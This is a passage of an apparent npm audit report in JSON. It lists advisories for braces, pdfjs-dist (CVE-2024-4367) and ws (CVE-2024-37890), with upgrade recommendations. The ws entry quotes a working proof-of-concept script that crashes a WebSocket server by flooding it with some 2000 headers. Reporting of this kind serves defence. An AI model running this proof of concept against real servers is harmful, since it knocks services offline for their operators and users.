NPM package `braces` fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends \"imbalanced braces\" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.\n","url":"https://github.com/advisories/GHSA-grv7-fg5c-xmjg"},"1097504":{"findings":[{"version":"2.5.207","paths":["@hmcts/media-viewer>pdfjs-dist"]}],"metadata":null,"vulnerable_versions":"<=4.1.392","module_name":"pdfjs-dist","severity":"high","github_advisory_id":"GHSA-wgrm-67xf-hhpq","cves":["CVE-2024-4367"],"access":"public","patched_versions":">=4.2.67","cvss":{"score":0,"vectorString":null},"updated":"2024-06-10T20:18:19.000Z","recommendation":"Upgrade to version 4.2.67 or later","cwe":[],"found_by":null,"deleted":null,"id":1097504,"references":"- https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq\n- https://github.com/mozilla/pdf.js/pull/18015\n- https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6\n- https://bugzilla.mozilla.org/show_bug.cgi?id=1893645\n- https://nvd.nist.gov/vuln/detail/CVE-2024-4367\n- https://lists.debian.org/debian-lts-announce/2024/05/msg00010.html\n- https://lists.debian.org/debian-lts-announce/2024/05/msg00012.html\n- https://www.mozilla.org/security/advisories/mfsa2024-21\n- https://www.mozilla.org/security/advisories/mfsa2024-22\n- https://www.mozilla.org/security/advisories/mfsa2024-23\n- https://github.com/advisories/GHSA-wgrm-67xf-hhpq","created":"2024-05-07T10:25:08.000Z","reported_by":null,"title":"PDF.js vulnerable to arbitrary JavaScript execution upon opening a malicious PDF","npm_advisory_id":null,"overview":"### Impact\nIf pdf.js is used to load a malicious PDF, and PDF.js is configured with `isEvalSupported` set to `true` (which is the default value), unrestricted attacker-controlled JavaScript will be executed in the context of the hosting domain.\n\n### Patches\nThe patch removes the use of `eval`:\nhttps://github.com/mozilla/pdf.js/pull/18015\n\n### Workarounds\nSet the option `isEvalSupported` to `false`. \n\n### References\nhttps://bugzilla.mozilla.org/show_bug.cgi?id=1893645","url":"https://github.com/advisories/GHSA-wgrm-67xf-hhpq"},"1097616":{"findings":[{"version":"7.4.6","paths":["@hmcts/media-viewer>socket.io-client>engine.io-client>ws"]}],"metadata":null,"vulnerable_versions":">=7.0.0 <7.5.10","module_name":"ws","severity":"high","github_advisory_id":"GHSA-3h5v-q93c-6h6q","cves":["CVE-2024-37890"],"access":"public","patched_versions":">=7.5.10","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"},"updated":"2024-06-17T19:09:12.000Z","recommendation":"Upgrade to version 7.5.10 or later","cwe":["CWE-476"],"found_by":null,"deleted":null,"id":1097616,"references":"- https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q\n- https://github.com/websockets/ws/issues/2230\n- https://github.com/websockets/ws/pull/2231\n- https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f\n- https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e\n- https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c\n- https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63\n- https://github.com/advisories/GHSA-3h5v-q93c-6h6q","created":"2024-06-17T19:09:10.000Z","reported_by":null,"title":"ws affected by a DoS when handling a request with many HTTP headers","npm_advisory_id":null,"overview":"### Impact\n\nA request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.\n\n### Proof of concept\n\n```js\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 0 }, function () {\n  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');\n  const headers = {};\n  let count = 0;\n\n  for (let i = 0; i < chars.length; i++) {\n    if (count === 2000) break;\n\n    for (let j = 0; j < chars.length; j++) {\n      const key = chars[i] + chars[j];\n      headers[key] = 'x';\n\n      if (++count === 2000) break;\n    }\n  }\n\n  headers.Connection = 'Upgrade';\n  headers.Upgrade = 'websocket';\n  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';\n  headers['Sec-WebSocket-Version'] = '13';\n\n  const request = http.request({\n    headers: headers,\n    host: '127.0.0.1',\n    port: wss.address().port\n  });\n\n  request.end();\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)\n\n### Workarounds\n\nIn vulnerable versions of ws, the issue can be mitigated in the following ways:\n\n1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.\n2. Set `server.maxHeadersCount` to `0` so that no limit is applied.\n\n### Credits\n\nThe vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in https://github.com/websockets/ws/issues/2230.\n\n### References\n\n- https://github.com/websockets/ws/issues/2230\n- https://github.com/websockets/ws/pull/2231\n\n[`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize\n[`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener\n[`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount\n","url":"https://github.com/advisories/GHSA-3h5v-q93c-6h6q"}},"muted":[],"metadata":{"vulnerabilities":{"info":0,"low":0,"moderate":4,"high":15,"critical":0},"dependencies":778,"devDependencies":0,"optionalDependencies":0,"totalDependencies":778}}
